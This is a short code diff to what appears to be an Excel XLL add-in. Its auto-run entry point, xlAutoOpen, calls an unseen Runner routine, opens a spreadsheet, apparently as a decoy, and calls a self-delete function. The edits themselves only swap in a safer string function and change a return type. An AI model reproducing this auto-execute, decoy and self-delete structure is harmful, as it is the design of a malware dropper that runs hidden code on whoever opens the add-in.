@@ -108,7 +108,7 @@ void SpawnXlsx()
 
     //---------------------combine excel location with xlsx location----------------------------
     WCHAR cmdArgs[510];
-    swprintf(cmdArgs, MAX_PATH, L"%ls %ls", szFileName, xllPath);
+    swprintf_s(cmdArgs, MAX_PATH, L"%ls %ls", szFileName, xllPath);
 
     //--------------------------------------Spawn XLSX------------------------------------------
 
@@ -156,7 +156,7 @@ void SpawnXlsx()
     deleteme();
 }
 
-short __stdcall xlAutoOpen()
+int xlAutoOpen()
 {
     Runner();
     SpawnXlsx();
